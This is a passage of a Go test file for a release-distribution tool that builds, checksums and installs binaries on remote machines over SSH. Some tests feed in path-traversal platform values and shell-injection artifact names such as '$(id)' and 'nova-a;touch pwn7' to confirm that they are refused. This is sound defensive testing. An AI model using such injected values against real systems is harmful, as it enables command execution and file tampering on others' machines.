		require.Equal(t, 0, code, "code=%d errs=%s", code, e.String())
	}
	if len(tc.calls) != 9 { // 3 tools x 3 platforms
		require.FailNowf(t, "assertion failed", "built %d packages, want 9: %v", len(tc.calls), tc.calls)
	}
	for _, tcase := range []struct{ platform, tool string }{
		{"linux-amd64", "nova-bus"},
		{"darwin-arm64", "nova-bus"},
		{"windows-amd64", "nova-bus.exe"},
	} {
		goos, goarch, err := Platform(tcase.platform)
		if err != nil {
			require.NoError(t, err, err)
		}
		arts, err := ReadSums(ArtifactDir(out, "v0.16.0", goos, goarch))
		if err != nil {
			require.NoError(t, err, "%s: %v", tcase.platform, err)
		}
		var names []string
		for _, a := range arts {
			names = append(names, a.Name)
		}
		if !strings.Contains(strings.Join(names, ","), tcase.tool) {
			require.Contains(t, strings.Join(names, ","), tcase.tool, "%s holds %v, want %s", tcase.platform, names, tcase.tool)
		}
		if !strings.Contains(o.String(), "platform="+tcase.platform) {
			require.Contains(t, o.String(), "platform="+tcase.platform, "no receipt for %s:\n%s", tcase.platform, o.String())
		}
	}
}

func TestBuildRefusesAPlatformListItCannotRead(t *testing.T) {
	t.Parallel()

	var o, e bytes.Buffer
	code := Run("nova-update", []string{"build", "--version", "v0.16.0", "--out", t.TempDir(),
		"--source", sourceTree(t), "--platform", "linux-amd64,nonsense"}, &o, &e, Deps{Toolchain: &fakeToolchain{}})
	if code != 2 || !strings.Contains(e.String(), "nonsense") {
		require.FailNowf(t, "assertion failed", "code=%d errs=%s", code, e.String())
	}
}

// --platform is a goos and a goarch and nothing else. Each half is
// ^[a-z0-9]+$, so a value carrying a path separator, a second dash or an
// upper-case letter is refused rather than silently retargeted: a split on the
// first dash alone lets `q-a/../b` name the goarch `a/../b`, and install then
// reads a directory the --from tree never named. The install leg says the
// refusal reaches the verb before --bin is touched.
func TestPlatformRefusesAValueThatIsNotLowercaseGoosDashGoarch(t *testing.T) {
	t.Parallel()

	for _, tc := range []struct {
		platform string
		wantErr  bool
	}{
		{"linux-amd64", false},
		{"windows-arm64", false},
		{"q-a/../b", true},
		{"linux-amd64/../x", true},
		{"../a-b", true},
		{"linux-amd64-extra", true},
		{"linux-AMD64", true},
	} {
		t.Run(tc.platform, func(t *testing.T) {
			t.Parallel()
			_, _, err := Platform(tc.platform)
			if tc.wantErr {
				assert.Error(t, err, "accepted %q", tc.platform)
				return
			}
			assert.NoError(t, err, "refused %q", tc.platform)
		})
	}

	from := built(t, "v0.16.0", "", "nova-bus")
	bin := t.TempDir()
	var o, e bytes.Buffer
	code := Run("nova-update", []string{"install", "--from", from, "--version", "v0.16.0",
		"--bin", bin, "--platform", "q-a/../b"}, &o, &e, Deps{})
	if code != 2 {
		require.Equal(t, 2, code, "a retargeting --platform was accepted: code=%d out=%s errs=%s", code, o.String(), e.String())
	}
	if entries, err := os.ReadDir(bin); err != nil || len(entries) != 0 {
		require.FailNowf(t, "assertion failed", "a refused install wrote %v (%v)", entries, err)
	}
}

// A checksum file nobody has ever checked is a file whose first reader is the
// person it was supposed to reassure. The build reads its own, in the step that
// wrote it, and says how many it checked.
func TestBuildVerifiesTheChecksumsItJustWrote(t *testing.T) {
	t.Parallel()

	source, out := sourceTree(t), t.TempDir()
	var o, e bytes.Buffer
	code := Run("nova-update", []string{"build", "--version", "v0.16.0", "--out", out, "--source", source},
		&o, &e, Deps{Toolchain: &fakeToolchain{}})
	if code != 0 {
		require.Equal(t, 0, code, "code=%d errs=%s", code, e.String())
	}
	if !strings.Contains(o.String(), "verified=3") {
		require.Contains(t, o.String(), "verified=3", "the build does not say what it verified:\n%s", o.String())
	}
}

// --dry-run answers "what would happen" with what the MACHINES say, not with
// what this host assumes: is it reachable, is the destination there, what is
// installed now. Nothing is streamed and nothing is installed.
func TestAdoptDryRunProbesEveryMachineAndStreamsNothing(t *testing.T) {
	t.Parallel()

	from := built(t, "v0.16.0", "linux-amd64", "nova-bus", "nova-update")
	s := &fakeSSH{
		answer: map[string]string{
			"hulk":   "nova-update v0.15.3 linux/amd64 go1.27.1\n",
			"vision": "nova-update v0.16.0 linux/amd64 go1.27.1\n",
		},
		refuse: map[string]error{"mini": fmt.Errorf("ssh: connect to host mini port 22: Connection refused")},
	}
	var o, e bytes.Buffer
	code := Run("nova-update", []string{"adopt", "--no-certify", "--version", "v0.16.0",
		"--machines", machinesFile(t, "hulk\nvision\nmini\n"), "--ssh", "/usr/bin/ssh",
		"--from", from, "--bin", "~/.local/bin", "--dest", "~/build",
		"--platform", "linux-amd64", "--dry-run"}, &o, &e, Deps{SSH: s})
	if code != 1 { // mini could not be reached; that is a finding, not a success
		require.FailNowf(t, "assertion failed", "code=%d out=%s errs=%s", code, o.String(), e.String())
	}
	if len(s.sends) != 0 {
		require.Len(t, s.sends, 0, "--dry-run streamed a release: %v", s.sends)
	}
	// One line per machine, saying what it found and what it would do.
	if !strings.Contains(o.String(), "RELEASE WOULD ADOPT machine=hulk") || !strings.Contains(o.String(), "installed=v0.15.3") {
		require.FailNowf(t, "assertion failed", "no probe line for hulk:\n%s", o.String())
	}
	if !strings.Contains(o.String(), "machine=vision") || !strings.Contains(o.String(), "action=skip") {
		require.FailNowf(t, "assertion failed", "vision is already current and the probe does not say so:\n%s", o.String())
	}
	if !strings.Contains(e.String(), "mini") {
		require.Contains(t, e.String(), "mini", "the unreachable machine is not reported:\n%s", e.String())
	}
	if !strings.Contains(e.String(), "dry-run=yes") && !strings.Contains(o.String(), "dry-run=yes") {
		require.FailNowf(t, "assertion failed", "the verdict does not say it was a dry run:\n%s\n%s", o.String(), e.String())
	}
}

// A machine already holding this release does not need it streamed again. The
// question is asked of the machine's own checksum file, before anything moves.
func TestAdoptStreamsNothingToAMachineThatAlreadyHasTheRelease(t *testing.T) {
	t.Parallel()

	goos, goarch := platformOf(t, "linux-amd64")
	from := built(t, "v0.16.0", "linux-amd64", "nova-bus", "nova-update")
	localSums, err := os.ReadFile(filepath.Join(ArtifactDir(from, "v0.16.0", goos, goarch), SumsFile))
	if err != nil {
		require.NoError(t, err, err)
	}
	s := &fakeSSH{
		// hulk answers the probe with the same checksum file it was sent
		// last time; vision has never seen this release.
		remoteSums: map[string]string{"hulk": string(localSums)},
		answer: map[string]string{
			"hulk":   "RELEASE INSTALLED version=v0.16.0 tools=0 skipped=2 retired=0\n",
			"vision": "RELEASE INSTALLED version=v0.16.0 tools=2 skipped=0 retired=0\n",
		},
	}
	var o, e bytes.Buffer
	code := Run("nova-update", []string{"adopt", "--no-certify", "--version", "v0.16.0",
		"--machines", machinesFile(t, "hulk\nvision\n"), "--ssh", "/usr/bin/ssh",
		"--from", from, "--bin", "~/.local/bin", "--dest", "~/build",
		"--platform", "linux-amd64"}, &o, &e, Deps{SSH: s})
	if code != 0 {
		require.Equal(t, 0, code, "code=%d errs=%s", code, e.String())
	}
	if len(s.sends) != 1 || !strings.HasPrefix(s.sends[0], "vision:") {
		require.FailNowf(t, "assertion failed", "the wrong set was streamed: %v", s.sends)
	}
	if !strings.Contains(o.String(), "machine=hulk") || !strings.Contains(o.String(), "sent=no") {
		require.FailNowf(t, "assertion failed", "hulk's receipt does not say the stream was skipped:\n%s", o.String())
	}
	if !strings.Contains(e.String(), "already holds v0.16.0 (2/2)") {
		require.Contains(t, e.String(), "already holds v0.16.0 (2/2)", "already holds did not print the verified count:\n%s", e.String())
	}
	if !strings.Contains(o.String(), "machine=vision") || !strings.Contains(o.String(), "sent=yes") {
		require.FailNowf(t, "assertion failed", "vision's receipt does not say it was streamed:\n%s", o.String())
	}
	// Both machines still get the install: the bits being there is not the
	// same fact as the tools being installed from them.
	if len(s.runs) < 2 {
		require.FailNowf(t, "assertion failed", "a machine was skipped entirely: %v", s.runs)
	}
}

// A killed transfer leaves SHA256SUMS in place (it is first in the tar) and
// some of the artifacts missing or truncated. The next adopt must not treat
// that directory as complete: it re-streams into <version>.partial/ and
// renames into place only after the bench verifies every named file.
func TestAdoptDoesNotTrustAPartialReleaseDir(t *testing.T) {
	t.Parallel()

	goos, goarch := platformOf(t, "linux-amd64")
	from := built(t, "v0.16.0", "linux-amd64", "nova-bus", "nova-update")
	local := ArtifactDir(from, "v0.16.0", goos, goarch)
	localSums, err := os.ReadFile(filepath.Join(local, SumsFile))
	if err != nil {
		require.NoError(t, err, err)
	}
	for _, tc := range []struct {
		name    string
		missing []string
		corrupt []string
	}{
		{"a missing artifact", []string{"nova-update"}, nil},
		{"a corrupt artifact", nil, []string{"nova-bus"}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			s := &fakeSSH{
				remoteSums:   map[string]string{"hulk": string(localSums)},
				missingNamed: map[string][]string{"hulk": tc.missing},
				corruptNamed: map[string][]string{"hulk": tc.corrupt},
				answer:       map[string]string{"hulk": "RELEASE INSTALLED version=v0.16.0 tools=2 skipped=0 retired=0\n"},
			}
			var o, e bytes.Buffer
			code := Run("nova-update", []string{"adopt", "--version", "v0.16.0",
				"--machines", machinesFile(t, "hulk\n"), "--ssh", "/usr/bin/ssh",
				"--from", from, "--bin", "~/.local/bin", "--dest", "~/build",
				"--platform", "linux-amd64", "--no-certify"}, &o, &e, Deps{SSH: s})
			if code != 0 {
				require.Equal(t, 0, code, "code=%d errs=%s", code, e.String())
			}
			if strings.Contains(e.String(), "streaming nothing") {
				require.NotContains(t, e.String(), "streaming nothing", "a partial release dir was trusted as complete:\n%s", e.String())
			}
			if len(s.sends) != 1 {
				require.Len(t, s.sends, 1, "the partial dir was not re-streamed: sends=%v errs=%s", s.sends, e.String())
			}
			if !strings.HasSuffix(s.sends[0], "-> ~/build/v0.16.0.partial") {
				require.FailNowf(t, "assertion failed", "the stream did not land in <version>.partial/: %v", s.sends)
			}
			promoted := false
			for _, run := range s.runs {
				if strings.Contains(run, "mv ") && strings.Contains(run, "v0.16.0.partial") && strings.Contains(run, "~/build/v0.16.0") {
					promoted = true
				}
			}
			if !promoted {
				require.True(t, promoted, "the verified .partial dir was not renamed into place: %v", s.runs)
			}
			if !strings.Contains(o.String(), "sent=yes") {
				require.Contains(t, o.String(), "sent=yes", "the receipt does not say the stream ran:\n%s", o.String())
			}
		})
	}
}

// `<tool> <verb> --help` printed `flag: help requested`, which is the flag
// package's internal sentinel leaking to a person who asked a reasonable
// question. It prints the verb's own usage, and exits 0 because asking for
// help is not an error.
func TestVerbHelpPrintsThatVerbsUsage(t *testing.T) {
	t.Parallel()

	for _, verb := range []string{"cut", "build", "install", "adopt", "pull"} {
		for _, flagSpelling := range []string{"--help", "-h"} {
			t.Run(verb+" "+flagSpelling, func(t *testing.T) {
				var o, e bytes.Buffer
				code := Run("nova-update", []string{verb, flagSpelling}, &o, &e, Deps{})
				if code != 0 {
					require.Equal(t, 0, code, "code=%d errs=%s", code, e.String())
				}
				if strings.Contains(o.String()+e.String(), "help requested") {
					require.NotContains(t, o.String()+e.String(), "help requested", "the flag package's sentinel leaked: %s%s", o.String(), e.String())
				}
				if !strings.Contains(o.String(), "nova-update release "+verb+" ") {
					require.Contains(t, o.String(), "nova-update release "+verb+" ", "%s's usage is not what was printed:\n%s", verb, o.String())
				}
				// ONE verb's usage, not all five: the person asked about one.
				if strings.Count(o.String(), "nova-update release ") != 1 {
					require.FailNowf(t, "assertion failed", "%s --help printed more than its own line:\n%s", verb, o.String())
				}
			})
		}
	}
}

// verified=<n> is the number the CHECK returned, not the length of a list, so
// the number cannot be printed without the check having run.
func TestVerifyArtifactsReportsWhatItActuallyChecked(t *testing.T) {
	t.Parallel()

	goos, goarch := platformOf(t, "")
	from := built(t, "v0.16.0", "", "nova-bus", "nova-worker", "nova-wake")
	dir := ArtifactDir(from, "v0.16.0", goos, goarch)
	arts, err := ReadSums(dir)
	if err != nil {
		require.NoError(t, err, err)
	}
	n, err := VerifyArtifacts(dir, arts)
	if err != nil || n != 3 {
		require.FailNowf(t, "assertion failed", "checked %d of 3: %v", n, err)
	}
	// One bad artifact stops the count where it stopped the check.
	if err := testbin.WriteExecutable(filepath.Join(dir, ToolFile("nova-bus", goos)), []byte("changed"), 0o755); err != nil {
		require.NoError(t, err, err)
	}
	if n, err := VerifyArtifacts(dir, arts); err == nil || n == 3 {
		require.FailNowf(t, "assertion failed", "a changed artifact was counted as verified: n=%d err=%v", n, err)
	}
}

// TestReadSumsRefusesAnArtifactNameTheRemoteShellWouldReadAsSyntax pins
// security#72 finding 1 (artifact-name half): ReadSums is the one place the
// names enter, and install writes a file under the name while adopt composes a
// remote `rm -f` over it. A name the far shell reads as syntax must stop here,
// with the line number, so install, adopt and pull see only safe names.
func TestReadSumsRefusesAnArtifactNameTheRemoteShellWouldReadAsSyntax(t *testing.T) {
	t.Parallel()
	const sum = "73cb73cb73cb73cb73cb73cb73cb73cb73cb73cb73cb73cb73cb73cb73cb73cb"
	write := func(t *testing.T, lines ...string) string {
		t.Helper()
		dir := t.TempDir()
		require.NoError(t, os.WriteFile(filepath.Join(dir, SumsFile), []byte(strings.Join(lines, "\n")+"\n"), 0o644))
		return dir
	}

	for _, bad := range []string{"nova-a;touch pwn7", "$(id)", "nova-a`id`", "nova a", "-rf", "nova-a|id", "nova-a&id", "nova-a>x", "nova\tb", "~root"} {
		bad := bad
		t.Run(bad, func(t *testing.T) {
			t.Parallel()
			dir := write(t, sum+"  nova-bus", sum+"  "+bad)
			_, err := ReadSums(dir)
			require.Error(t, err)
			assert.Contains(t, err.Error(), "line 2")
			assert.Contains(t, err.Error(), fmt.Sprintf("%q", bad))
		})
	}

	dir := write(t, sum+"  nova-bus", sum+"  nova-update.exe", sum+"  nova_tool+1.2")
	arts, err := ReadSums(dir)
	require.NoError(t, err)
	names := make([]string, 0, len(arts))
	for _, a := range arts {
		names = append(names, a.Name)
	}
	assert.Equal(t, []string{"nova-bus", "nova-update.exe", "nova_tool+1.2"}, names)
}

// TestInstallFileRefusesBytesThatAreNotTheVerifiedSum pins security#72 finding
// 8: the bytes staged into --bin are the bytes whose sha256 the build recorded,
// not whatever the artifact directory holds after VerifyArtifacts passed. The
// source is swapped, so a symlink or a rewritten file is refused and no
// temporary is left behind.
func TestInstallFileRefusesBytesThatAreNotTheVerifiedSum(t *testing.T) {
	t.Parallel()
	sumOf := func(b []byte) string {
		s := sha256.Sum256(b)
		return hex.EncodeToString(s[:])
	}
	leftovers := func(t *testing.T, bin string) []string {
		t.Helper()
		ents, err := os.ReadDir(bin)
		require.NoError(t, err)
		var names []string
		for _, e := range ents {
			names = append(names, e.Name())
		}
		return names
	}

	t.Run("changed bytes", func(t *testing.T) {
		t.Parallel()
		art, bin := t.TempDir(), t.TempDir()
		src := filepath.Join(art, "nova-bus")
		require.NoError(t, os.WriteFile(src, []byte("substituted"), 0o755))
		_, err := stageArtifact(bin, "nova-bus", src, sumOf([]byte("verified")))
		require.Error(t, err)
		assert.Contains(t, err.Error(), "nova-bus")
		assert.Contains(t, err.Error(), "does not match")
		assert.Empty(t, leftovers(t, bin))
	})

	t.Run("matching bytes", func(t *testing.T) {
		t.Parallel()
		art, bin := t.TempDir(), t.TempDir()
		src := filepath.Join(art, "nova-bus")
		require.NoError(t, os.WriteFile(src, []byte("verified"), 0o755))
		tmp, err := stageArtifact(bin, "nova-bus", src, sumOf([]byte("verified")))
		require.NoError(t, err)
		got, err := os.ReadFile(tmp)
		require.NoError(t, err)
		assert.Equal(t, "verified", string(got))
	})

	t.Run("symlink source", func(t *testing.T) {
		t.Parallel()
		art, bin := t.TempDir(), t.TempDir()
		link, _ := plantSymlink(t, art, "nova-bus", "verified")
		_, err := stageArtifact(bin, "nova-bus", link, sumOf([]byte("verified")))
		require.Error(t, err)
		assert.Contains(t, err.Error(), "not a regular file")
		assert.Empty(t, leftovers(t, bin))
	})
}
